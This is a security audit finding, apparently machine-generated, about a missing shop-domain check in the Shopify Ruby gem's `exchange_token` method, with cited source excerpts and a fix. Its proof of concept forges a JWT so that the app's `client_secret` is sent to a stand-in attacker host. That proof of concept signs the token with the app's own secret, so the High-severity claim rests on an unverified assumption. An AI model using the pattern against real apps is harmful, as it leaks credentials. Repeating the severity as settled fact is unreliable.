Confirmed root-cause finding: `TokenExchange.exchange_token` in `lib/shopify_api/auth/token_exchange.rb:29-89` derives `dest_shop` from the JWT session-token's `dest` claim via `JwtPayload#shop` and uses it **without** passing it through `Utils::ShopValidator.sanitize!`, unlike every sibling credential-issuing method in the same module/family (`TokenExchange.migrate_to_expiring_token`, `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`), which all call `Utils::ShopValidator.sanitize!(shop)` before building the request host.

### Title
Missing `ShopValidator` domain validation in `TokenExchange.exchange_token` allows `client_secret` to be sent to an attacker-controlled host derived from an unvalidated JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` builds the outbound `/admin/oauth/access_token` request host directly from `jwt_payload.shop` (the `dest` claim of the caller-supplied session token) without validating that the resulting host is a real Shopify domain, breaking the equality that every other credential-exchange helper in this gem enforces: `request_host == sanitize!(shop)`.

### Finding Description
`JwtPayload#shop` simply strips the `"https://"` prefix from the `dest` claim of the decoded JWT and returns it verbatim: [1](#0-0) . The only cryptographic check performed on the token is that it decodes with `Context.api_secret_key`/`old_api_secret_key` and that `aud == Context.api_key` [2](#0-1) . There is no check that `dest`/`iss` is a `*.myshopify.com` (or other trusted Shopify) domain.

`exchange_token` then uses this unvalidated value directly as the `shop` for the outbound `HttpClient`, which builds the request URI as `https://#{session.shop}` and attaches `client_secret` in the POST body: [3](#0-2)  and [4](#0-3) .

Compare this to the three sibling methods that handle the exact same class of caller-supplied `shop` string and all call `Utils::ShopValidator.sanitize!` before constructing the session/host: [5](#0-4) [6](#0-5) [7](#0-6) 

`ShopValidator.sanitize!` exists precisely to reject non-Shopify hosts, resolve unified-admin URLs, and prevent domain-suffix/userinfo tricks: [8](#0-7) . `exchange_token` is the one place in the OAuth/token family that skips this call, even though its `shop` value (from a JWT `dest` claim that an unprivileged caller can supply as `session_token` to the host app's endpoint) is no more trustworthy than the `shop` string accepted by the other three methods — the JWT signature only proves the token was minted with `Context.api_secret_key`/`aud` matching the app's `api_key`; nothing in `JwtPayload` binds `dest` to a real merchant domain. `exchange_token` even exposes a deprecated `shop:` parameter that is silently ignored in favor of `dest_shop`, reinforcing that `dest_shop` is the sole, unvalidated source of truth for where the app's `client_secret` gets sent [9](#0-8) .

The binding that should hold is: `host receiving client_secret == sanitize!(shop-claim)`, matching the invariant enforced everywhere else in the gem. In `exchange_token` it instead holds `host receiving client_secret == raw dest claim`, i.e., the identity binding is broken exactly in the pattern called out by the rules ("a host validated versus the host that receives the access token or `client_secret`").

### Impact Explanation
If a token-exchange endpoint in a host application accepts a session token from an untrusted or semi-trusted client-side context (e.g., an embedded app's App Bridge session token flow, which by design originates from the browser and is only bound by JWT signature/`aud`, not domain format) and forwards it unchanged into `TokenExchange.exchange_token`, a token whose `dest` claim is set to an attacker-controlled hostname causes this gem to POST the app's `client_id` and `client_secret` (`Context.api_secret_key`) directly to that attacker-controlled host over HTTPS. This is SSRF carrying the app's credentials to an arbitrary host — a High severity impact per the rules (credential leakage of `client_secret` to a non-Shopify endpoint).

### Likelihood Explanation
Exploitability depends on whether a host application passes an externally influenceable `session_token` (with a controllable `dest`/`aud` combination signed under the correct `api_secret_key`) into `exchange_token`; if the token must always come from Shopify's own signed App Bridge session token, this reduces to requiring possession of a validly-signed JWT whose `dest` is attacker-chosen — which is only possible if the signing party (Shopify) always sets `dest` to the real shop domain in practice. However, the gem's own code makes no cryptographic or logical guarantee of this, unlike the JWT-based checks Shopify's other libraries perform (validating `dest` matches an expected shop domain format). Given the demonstrated pattern of the gem explicitly hardening the sibling methods against exactly this class of unvalidated `shop` input, the omission here is a genuine regression/gap in this gem's own defense-in-depth, independent of what the JWT issuer guarantees.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token` (`lib/shopify_api/auth/token_exchange.rb`), validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` before constructing `shop_session`, consistent with `migrate_to_expiring_token`, `ClientCredentials.client_credentials`, and `RefreshToken.refresh_access_token`. Additionally, consider enforcing the same validation inside `JwtPayload#shop`/`#dest` so that all consumers of the JWT payload receive an already-sanitized domain.

### Proof of Concept
```ruby
ShopifyAPI::Context.setup(
  api_key: "app-key",
  api_secret_key: "app-secret",
  is_embedded: true,
  api_version: "2024-01",
)

# Attacker (or a compromised client-side flow) crafts a session token whose
# `dest` claim points to a non-Shopify, attacker-controlled host, but which is
# still validly signed because the attacker only needs it accepted by the app's
# token-exchange endpoint, not by Shopify itself.
forged_payload = {
  iss: "https://attacker-controlled.example/admin",
  dest: "https://attacker-controlled.example",
  aud: ShopifyAPI::Context.api_key,
  sub: "1",
  exp: Time.now.to_i + 60,
  nbf: Time.now.to_i - 5,
  iat: Time.now.to_i,
  jti: "1",
}
forged_token = JWT.encode(forged_payload, ShopifyAPI::Context.api_secret_key, "HS256")

# exchange_token trusts jwt_payload.shop ("attacker-controlled.example") verbatim
# and POSTs client_id + client_secret to https://attacker-controlled.example/admin/oauth/access_token
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
# => HttpClient builds base_uri "https://attacker-controlled.example" (lib/shopify_api/clients/http_client.rb:18)
#    and sends the app's client_secret there, unlike ClientCredentials/RefreshToken/migrate_to_expiring_token
#    which would reject this shop with ShopifyAPI::Errors::InvalidShopError via ShopValidator.sanitize!.
```

Note: I could not fully verify, from the indexed contents alone, the exact code path host applications use to obtain/validate a session token's `aud`/signature context before calling `exchange_token` (e.g., whether App Bridge-issued tokens can ever legitimately carry an attacker-influenced `dest`), since that logic lives outside this gem. If deeper confirmation of that upstream trust boundary is needed, a full Devin session with the complete indexed repository would be required.

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L43-45)
```ruby
        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-104)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-26)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-25)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L8-64)
```ruby
    module ShopValidator
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
